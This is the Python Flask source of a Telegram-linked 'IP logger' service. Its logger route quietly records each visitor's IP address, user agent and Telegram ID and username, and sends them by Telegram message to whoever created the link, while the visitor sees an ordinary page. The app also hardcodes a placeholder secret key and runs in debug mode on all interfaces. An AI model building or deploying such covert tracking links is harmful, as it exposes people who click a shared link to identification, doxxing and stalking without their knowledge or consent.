from flask import Flask, request, render_template, jsonify, redirect, url_for
import sqlite3
import asyncio
from datetime import datetime
import json
import os
from database import Database
import requests
from config import BOT_TOKEN
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Change this!

# Initialize database with absolute path (PythonAnywhere safe)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'database.db')
db = Database(DB_PATH)

# --- Telegram notify helpers ---
def send_telegram_message(chat_id: int, text: str):
    if not BOT_TOKEN or not chat_id:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }
        requests.post(url, data=payload, timeout=5)
    except Exception as e:
        print(f"Telegram send error: {e}")


def get_owner_by_unique_id(unique_id: str):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM loggers WHERE unique_id = ? AND is_active = TRUE', (unique_id,))
        row = cursor.fetchone()
        conn.close()
        return row[0] if row else None
    except Exception as e:
        print(f"DB get_owner error: {e}")
        return None

@app.route('/')
def index():
    """Main page"""
    return render_template('index.html')

@app.route('/logger/<logger_id>')
def logger_page(logger_id):
    """Logger page that collects IP and user info"""
    try:
        # Get client IP
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        
        # Get user agent
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Get Telegram Web App data from URL parameters
        telegram_user_id = request.args.get('tg_user_id')
        telegram_username = request.args.get('tg_username')
        
        # Log the IP address asynchronously
        asyncio.run(db.log_ip(
            logger_id=logger_id,
            ip_address=ip_address,
            user_agent=user_agent,
            telegram_user_id=int(telegram_user_id) if telegram_user_id else None,
            telegram_username=telegram_username
        ))
        
        # Notify owner
        owner_id = get_owner_by_unique_id(logger_id)
        if owner_id:
            tg_id_text = telegram_user_id if telegram_user_id else '—'
            tg_username_text = f"@{telegram_username}" if telegram_username else '—'
            msg = (
                f"<b>Новый переход по логгеру</b>\n"
                f"ID: <code>{logger_id}</code>\n"
                f"IP: <code>{ip_address}</code>\n"
                f"UA: <code>{user_agent}</code>\n"
                f"TG ID: <code>{tg_id_text}</code>\n"
                f"Username: {tg_username_text}"
            )
            send_telegram_message(owner_id, msg)
        
        return render_template('logger.html', logger_id=logger_id)
        
    except Exception as e:
        print(f"Error in logger page: {e}")
        return render_template('error.html')

@app.route('/api/log', methods=['POST'])
def log_ip_api():
    """API endpoint for logging IP"""
    try:
        data = request.get_json()
        logger_id = data.get('logger_id')
        ip_address = data.get('ip_address')
        user_agent = data.get('user_agent')
        telegram_user_id = data.get('telegram_user_id')
        telegram_username = data.get('telegram_username')
        
        if not all([logger_id, ip_address, user_agent]):
            return jsonify({'error': 'Missing required fields'}), 400
        
        # Log the IP address
        success = asyncio.run(db.log_ip(
            logger_id=logger_id,
            ip_address=ip_address,
            user_agent=user_agent,
            telegram_user_id=telegram_user_id,
            telegram_username=telegram_username
        ))
        
        if success:
            owner_id = get_owner_by_unique_id(logger_id)
            if owner_id:
                tg_id_text = str(telegram_user_id) if telegram_user_id else '—'
                tg_username_text = f"@{telegram_username}" if telegram_username else '—'
                msg = (
                    f"<b>Новый переход по логгеру</b>\n"
                    f"ID: <code>{logger_id}</code>\n"
                    f"IP: <code>{ip_address}</code>\n"
                    f"UA: <code>{user_agent}</code>\n"
                    f"TG ID: <code>{tg_id_text}</code>\n"
                    f"Username: {tg_username_text}"
                )
                send_telegram_message(owner_id, msg)
            return jsonify({'success': True})
        else:
            return jsonify({'error': 'Failed to log IP'}), 500
            
    except Exception as e:
        print(f"Error in log IP API: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/stats/<logger_id>')
def get_logger_stats(logger_id):
    """Get logger statistics"""
    try:
        # Get logger info
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, name FROM loggers 
            WHERE unique_id = ? AND is_active = TRUE
        ''', (logger_id,))
        
        logger_row = cursor.fetchone()
        if not logger_row:
            conn.close()
            return jsonify({'error': 'Logger not found'}), 404
        
        actual_logger_id = logger_row[0]
        logger_name = logger_row[1]
        
        stats = asyncio.run(db.get_logger_stats(actual_logger_id))
        
        conn.close()
        
        return jsonify({
            'logger_name': logger_name,
            'total_logs': stats['total_logs'],
            'recent_logs': stats['recent_logs']
        })
        
    except Exception as e:
        print(f"Error getting stats: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8080)
